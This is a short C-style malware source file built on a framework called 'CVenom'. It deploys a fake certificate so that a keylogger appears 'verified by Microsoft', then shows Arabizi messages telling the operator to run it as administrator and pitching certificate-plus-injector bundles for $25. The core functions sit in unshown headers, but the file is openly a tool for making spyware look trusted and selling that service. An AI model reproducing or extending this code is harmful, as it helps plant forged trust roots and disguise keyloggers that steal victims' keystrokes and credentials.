#include <CVenom.h>
#include <DominationTools.h>
#include <UITools.h>


int main(MALWARE_ENTRY){
	cvinit(MALWARE_INIT);

	DominationTools	Dom;
	UITools	Ui;

	Dom.DeployFakeCertificate();


	if (Current.privileges == ADMIN){
		Ui.InformateUser("Great", "Shefet Verified by microsoft :), keylogger l 7nbi3o verified by microsoft");
		Ui.AskUser("Shou Ra2yak?", "na3mel Certificates wnbi3a ma3 l Injector ? kl Cert b $25 !?");
		cvexit(0);
	}


	Ui.InformateUser("Great", "hala2 kbos run as administrator w shouf eno verified w rja3 kbos cancel");

	cvexit(MALWARE_EXIT);
}
